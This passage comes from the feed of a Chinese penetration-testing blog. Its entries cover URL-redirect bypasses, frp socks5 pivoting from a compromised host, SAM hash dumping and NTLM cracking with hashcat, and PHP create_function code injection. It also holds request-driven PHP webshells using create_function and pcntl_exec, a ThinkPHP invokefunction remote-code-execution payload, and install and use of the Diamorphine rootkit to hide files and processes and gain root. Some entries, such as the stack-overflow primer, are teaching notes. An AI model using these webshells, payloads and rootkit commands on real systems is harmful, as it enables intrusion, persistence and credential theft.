      <url>/2019/05/27/web-url-hacking.html</url>
      
        <content type="html"><![CDATA[<p>碰到一个任意URL跳转漏洞，第一次测的时候居然没有测出来，记录下笔记，以下是绕过的方式:</p><h3 id="0x01-小老鼠跳转绕过"><a href="#0x01-小老鼠跳转绕过" class="headerlink" title="0x01: 小老鼠跳转绕过"></a>0x01: 小老鼠跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p><h3 id="0x02-跳转绕过"><a href="#0x02-跳转绕过" class="headerlink" title="0x02: ?跳转绕过"></a>0x02: ?跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p><h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03: #绕过"></a>0x03: #绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p><h3 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04: /绕过"></a>0x04: /绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p><h3 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05: \绕过"></a>0x05: \绕过</h3><pre class="line-numbers language-none"><code class="language-none">\在浏览器会自动转变为&#x2F; http:&#x2F;\&#x2F;baidu.com http:\&#x2F;&#x2F;baidu.com  &#x2F;\&#x2F;baidu.com http:\\\&#x2F;&#x2F;baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x06-子域名绕过"><a href="#0x06-子域名绕过" class="headerlink" title="0x06: 子域名绕过"></a>0x06: 子域名绕过</h3><p>比如 v2ex.com.xiaozhupeiqi.com, 最后会跳转到xiaozhupeiqi.com，攻击者控制的域名。</p><h3 id="0x07-xip-io-绕过"><a href="#0x07-xip-io-绕过" class="headerlink" title="0x07: xip.io 绕过"></a>0x07: xip.io 绕过</h3><p>类似子域名绕过，比如请求127.0.0.1.xip.io,会自动解析到127.0.0.1，下面的会自动跳转到baidu.com</p><p><img src="/2019/05/27/web-url-hacking/15589545309592.jpg"></p><h2 id="URL-Hacking"><a href="#URL-Hacking" class="headerlink" title="URL Hacking"></a>URL Hacking</h2><p>这部分是从wooyun的文章摘过来的，我记得很清楚，这个作者之前在zone里面回答过我一个问题，那时候我是个菜鸟,那时候我看漏洞的时候甚至不知道怎么看一个ID是<code>/fd</code>报的漏洞。(wooyun 你好，wooyun再见)。</p><p>这部分有两个地方感觉比较有意义:</p><ol><li>URL八进制</li></ol><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！结果就是: http:&#x2F;&#x2F;0016373751032<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>frps的socks5代理</title>
      <link href="/2019/05/08/frps.html"/>
      <url>/2019/05/08/frps.html</url>
      
        <content type="html"><![CDATA[<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p><p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p><p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p><p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p><pre class="line-numbers language-none"><code class="language-none">frps.ini: [common]bind_port &#x3D; 10086privilege_token &#x3D; [passwd]max_pool_count &#x3D; 50dashboard_port &#x3D; [port]dashboard_user &#x3D; [user]dashboard_pwd &#x3D; [password]use_encryption &#x3D; trueuse_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p><pre class="line-numbers language-none"><code class="language-none">frpc.ini[common]server_addr &#x3D; [vps ip]server_port &#x3D; 10086privilege_token &#x3D; [passwd]max_pool_count &#x3D; 50[socks5]type &#x3D; tcpremote_port &#x3D; [port]plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP经验</title>
      <link href="/2019/04/02/OSCP-experience.html"/>
      <url>/2019/04/02/OSCP-experience.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876uth-user-pass auth.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p><p>具体网络不稳定有两个表现:</p><ol><li>nmap扫描全部的端口长时间没有反应.</li><li>dirbuster扫描的时候会卡死进行不下去了.</li></ol><p>上面两个问题有两个解决方法:</p><ol><li>nmap换成<a href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li><li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li></ol><h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p><h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2><p>监考放松，当监考老师不存在。想吃啥吃啥，想喝就喝，放松心态。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hashcat笔记</title>
      <link href="/2019/03/01/hashcat.html"/>
      <url>/2019/03/01/hashcat.html</url>
      
        <content type="html"><![CDATA[<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p><pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedumpusage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;root@kali:~# lsadumpusage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;root@kali:~# pwdumpusage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取的格式大概是这样:</p><pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system samAdministrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p><p>可以使用hashcat来跑密码:</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中的hash.txt 可以指的是上面的NT-HASH。</p><pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。--force 忽略无显卡，直接跑hash.txt 就是上面的NT-HASH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><a href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p></li><li><p><a href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p></li><li><p><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>create_function</title>
      <link href="/2019/01/10/create_function.html"/>
      <url>/2019/01/10/create_function.html</url>
      
        <content type="html"><![CDATA[<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p><p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p><pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;  eval(&quot;    function lambda_1 ($args) &#123; $code &#125;  &quot;);  return &#39;lambda_1&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p><pre class="line-numbers language-none"><code class="language-none">eval(&quot;  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一个可控的情况下,这样就可以执行phpinfo:</p><pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p><pre class="line-numbers language-none"><code class="language-none">gdb --args &#x2F;opt&#x2F;php72&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;pentest&#x2F;create1.phpbreak zend_eval_stringlrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/01/10/create_function/create.png"></p><p>图中的<code>function __lambda_function()&#123;&#125;phpinfo();//)&#123;&#125;</code>会整个当作字符串去做一个eval,所以就可以执行phpinfo了，之前纠结的点是<code>function __lambda_func()&#123;phpinfo();&#125;//)&#123;&#125;</code>这样才执行，因为看成这个函数去执行phpinfo。搜了下资料才慢慢明白。所以执行命令可以这样:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpcreate_function(&#39;)&#123;&#125;system(&quot;whoami&quot;);&#x2F;&#x2F;&#39;, &#39;&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">The PHP interpreter supports eval in which you can evaluate any PHP expression. An interesting eval function is the zend_eval_stringl function that will PHP evaluate a string. So if we want to get the value of a specific variable $foo in a diversion session in RR we can execute print zend_eval_stringl(&quot;var_export($foo, true)&quot;, ...) in GDB7. To get the stack trace we can call the PHP function debug_backtrace() via zend_eval_stringl. <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外一点，匿名函数在php里面是有名字的:<code>\0__lambda_1</code>，最后1是数字，从小到达排列，它的第一个字符是空字符<code>\0</code>，因为用户无法在代码中定义这样的函数，其实还是可以的<code>&lt;?php $my_func = chr(0) . &quot;lambda_1&quot;;</code>，关于匿名函数有名字这个可以在Hitcon 2017 《Baby^H Master PHP 2017》的writeup里面找到。</p><ul><li><a href="https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7">https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7</a></li><li><a href="https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp">https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp</a></li><li><a href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html">https://gywbd.github.io/posts/2016/2/debug-php-source-code.html</a></li><li><a href="http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/">http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/</a> </li><li><a href="https://gywbd.github.io/posts/2016/2/vld-opcode.html">https://gywbd.github.io/posts/2016/2/vld-opcode.html</a></li><li><a href="http://treelib.com/book-detail-id-15-aid-604.html">http://treelib.com/book-detail-id-15-aid-604.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pcntl_exec</title>
      <link href="/2018/12/18/pcntl_exec.html"/>
      <url>/2018/12/18/pcntl_exec.html</url>
      
        <content type="html"><![CDATA[<p>2019.8.1更新</p><p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;** * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程 *&#x2F;&#x2F;&#x2F;生成子进程$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];$pid &#x3D; pcntl_fork();if($pid &#x3D;&#x3D; -1)&#123;    die(&#39;could not fork&#39;);&#125;else&#123;    if($pid)&#123;        $status &#x3D; 0;        pcntl_exec($cmd[0], $cmd[1]);        posix_kill(getmypid(),9);&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式        pcntl_wait($status);        exit;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p><p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p><hr><pre class="line-numbers language-none"><code class="language-none">参数执行:pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502执行脚本:pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">返回值200&lt;?php$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];if(function_exists(&#39;pcntl_exec&#39;)) &#123;    switch(pcntl_fork())&#123;     case 0:        pcntl_exec($cmd[0], $cmd[1]);    default:          echo &quot;case 111&quot;;    &#125;&#125; else &#123;        echo &#39;不支持pcntl扩展&#39;;&#125;?&gt;cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;Content-Type: text&#x2F;plain&quot;);$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;@unlink($cmd);@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;file_put_contents($cmd, $c);chmod($cmd, 0777);switch (pcntl_fork()) &#123;  case 0:    $ret &#x3D; pcntl_exec($cmd);    exit(&quot;case 0&quot;);  default:    echo &quot;case 1&quot;;    break;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面执行的脚本那行chmod不可以少</p><ul><li><a href="https://bugs.leavesongs.com/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/lnmp%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAphp%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://bugs.leavesongs.com/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/lnmp%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAphp%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LKM Rootkit</title>
      <link href="/2018/07/18/lkm-rootkit.html"/>
      <url>/2018/07/18/lkm-rootkit.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p><p>编译安装:</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphinecd Diamorphinemakeinsmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p><pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块rmmod diamorphine   删除rootkitkill -64 0  从任意用户切换到root用户kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出学习笔记</title>
      <link href="/2018/07/05/stack.html"/>
      <url>/2018/07/05/stack.html</url>
      
        <content type="html"><![CDATA[<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p><ol><li>代码区：可执行指令</li><li>数据区：用于存储全局变量</li><li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li><li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li></ol><p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p><p>内存中的栈区指的就是系统栈，由系统自动维护。</p><p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p><ul><li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li><li>%ebp 指向栈的底部</li><li>%eip 用来存储即将执行的程序指令的地址</li><li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li><li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li></ul><p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p><ul><li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li><li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li><li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li><li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li></ul><p>栈操作（在32位下)：</p><ul><li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li><li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li></ul><p>32位x86家狗下的汇编语言有Intel和AT&amp;T两种格式，主要差别如下：</p><p>Intel格式，寄存器和数值前无符号:</p><blockquote><p>指令名称 目标操作数DST, 源操作数SRC</p></blockquote><p>AT&amp;T格式， 寄存器名称前加”%”, 数值前加”$”</p><blockquote><p>指令名称  源操作数SRC， 目标操作数DST</p></blockquote><p>栈内存结构:</p><ul><li>LEA: 取地址指令，将MEM的地址存至REG，格式为</li></ul><pre class="line-numbers language-none"><code class="language-none">lea REG, MEM;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ADD/SUB: 加/减指令， 将运算结果存至DST, 格式</li></ul><pre class="line-numbers language-none"><code class="language-none">ADD&#x2F;SUB DST, SRC;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>RET: 返回指令，操作将栈顶数据弹出至eip。将返回地址出栈，并跳转到返回地址.它就是将栈顶保存的数据出栈，然后跳转到这个数字指向的空间。</li></ul><pre class="line-numbers language-none"><code class="language-none">RET;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>RET: pops the return address off the stack and returns control to that location.</p></li><li><p>CALL: pushes the return address onto the return and transfers control to a procedure.</p></li></ul><blockquote><p>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p></blockquote><p>函数调用大致包含以下步骤：</p><pre class="line-numbers language-none"><code class="language-none">参数入栈（一般是逆序入栈）: 具体包括：压入需要保存的寄存器，通常这些寄存器包括eax，ecx，edx等返回地址入栈代码区跳转栈帧调整：具体包括保存当前栈帧状态值（push ebp）将当前栈帧切换到新栈帧（move ebp,esp）给新栈帧分配空间（把ESP减去所需空间大小，抬高栈顶）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关指令：</p><ul><li>Call func -&gt; push pc, jmp func</li><li>Leave -&gt; mov esp,ebp pop ebp</li><li>Ret -&gt; pop pc</li></ul><p>函数返回大致包含如下步骤：</p><pre class="line-numbers language-none"><code class="language-none">保存返回值（通常保存在EAX中）弹出当前栈帧，恢复上一个栈帧：具体包括在堆栈平衡的基础上给ESP加上栈帧的大小，降低栈顶，回收当前栈空间将当前栈帧底部保存的前栈帧EBP值弹入EBP，恢复出上一个栈帧将函数返回地址弹给EIP跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Stack is collections of stack frame, each function in program create a new fram in stack and frame pointer keep the current location of frame which is executing</p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><h4 id="0x01-被调用函数参数入栈"><a href="#0x01-被调用函数参数入栈" class="headerlink" title="0x01 被调用函数参数入栈"></a>0x01 被调用函数参数入栈</h4><p>  变化的核心就是将调用函数(caller)的状态保存起来，同时创建被调用函数（callee）的状态。</p><p>  首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。</p><p><img src="/2018/07/05/stack/v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg"></p><h4 id="0x02-调用函数返回地址入栈"><a href="#0x02-调用函数返回地址入栈" class="headerlink" title="0x02 调用函数返回地址入栈"></a>0x02 调用函数返回地址入栈</h4><p> 然后将调用函数（caller）进行调用之后的下一条指令作为返回地址入栈，这样调用函数（caller)的EIP指令信息得以保存。</p><p><img src="/2018/07/05/stack/v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg"></p><h4 id="0x03-调用函数ebp入栈"><a href="#0x03-调用函数ebp入栈" class="headerlink" title="0x03 调用函数ebp入栈"></a>0x03 调用函数ebp入栈</h4><p>再将当前的ebp寄存器的值（也就是调用函数的基地址）压入栈内，并将当前ebp的值，更新位当前栈顶的位置。这样调用函数（caller）的ebp(基地址）信息得以保存，同时，ebp被更新位被调用函数（callee)的基地址。</p><p><img src="/2018/07/05/stack/v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg"></p><h4 id="0x04-被调用函数（callee）局部变量等入栈"><a href="#0x04-被调用函数（callee）局部变量等入栈" class="headerlink" title="0x04 被调用函数（callee）局部变量等入栈"></a>0x04 被调用函数（callee）局部变量等入栈</h4><p><img src="/2018/07/05/stack/v2-63f07378642e6f38197ddfb817567f6c_hd.jpg"></p><p>在压栈的过程中，esp寄存器的值不断减小，对应栈从内存的高地址向低地址生长），压入栈内的数据包括（调用参数，返回地址，调用函数的基地址以及局部变量）</p><h4 id="0x05-调用结束时候"><a href="#0x05-调用结束时候" class="headerlink" title="0x05 调用结束时候"></a>0x05 调用结束时候</h4><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶指向被调用函数(callee)的基地址：</p><p><img src="/2018/07/05/stack/v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg"></p><p>然后将基地址（ebp）内存储的调用（caller)函数的基地址从栈内弹出，并保存到ebp寄存器内。这样调用函数(caller)的ebp(基地址)信息得以恢复。此时栈顶指向返回地址。</p><p><img src="/2018/07/05/stack/v2-cd8d0fef17eecfff68f29022660a1c85_hd.jpg"></p><p>####0x06  返回地址弹出</p><p>再将返回地址从栈内弹出，并存到eip寄存器内。这样调用函数（caller)的eip(指令)信息得以恢复。</p><p><img src="/2018/07/05/stack/v2-3e7a4c71117d43ac59bcb3bd186a8e9f_hd.jpg"></p><h4 id="0x07-溢出"><a href="#0x07-溢出" class="headerlink" title="0x07 溢出"></a>0x07 溢出</h4><p>在函数正在执行内部指令的过程中，我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转。控制程序执行指令最关键的寄存器就是eip，所以目标就是让eip载入攻击指令的地址。</p><p>如果要eip指向攻击指令，首先在退栈的过程中，返回地址会被传给eip，我们只需要让溢出数据用攻击指令的地址来覆盖返回地址即可。</p><p><img src="/2018/07/05/stack/v2-e3af4f558ccb439e042e7a169cae2f97_hd.jpg"></p><p>让eip指向攻击指令，有这四种技术:</p><ul><li> 修改返回地址，让其指向溢出数据中的一段指令(shellcode)</li><li> 修改返回地址，让其指向内存中已有的某个函数(return2libc)</li><li> 修改返回地址，让其指向内存中已有的一段指令(ROP)</li><li> 修改某个被调用函数的地址，让其指向另外一个函数(hijack GOT)</li></ul><p>在上面几个流程图里面，可以看到<strong>参数与局部变量的分界线为EBP的值</strong>。</p><p><img src="https://pic4.zhimg.com/80/v2-89a65a58325afb516a7047b63940ee81_hd.jpg"></p><p>在上面方法中，生效的前提是在函数调用栈上的数据(shellcode）要有可执行权限（另外一个前提是上面提到的关闭内存布局随机化）。很多操作系统会关闭函数调用栈的可执行权限，这样shellcode的方法就失效了。不过可以尝试使用内存中已有指令或函数，包括return2libc和ROP两种方法。</p><h3 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h3><p>在内存中确定某个函数的地址，并用其覆盖掉返回地址。用于libc动态库被广泛使用，所以有很大概率在内存中找到该动态库。同时由于该库包含一些系统级的函数(比如system()等)。鉴于要执行的函数可能需要参数，比如调用system()函数打开shell完整形式为system(“/bin/sh”)，所以溢出数据需要包括必要的参数。</p><p>payload: padding1 + address of system() + padding2 + address of “/bin/sh”</p><p><img src="/2018/07/05/stack/v2-4523795fdf150416d91e4e4adc0ef0ae_hd.jpg"></p><p>address of 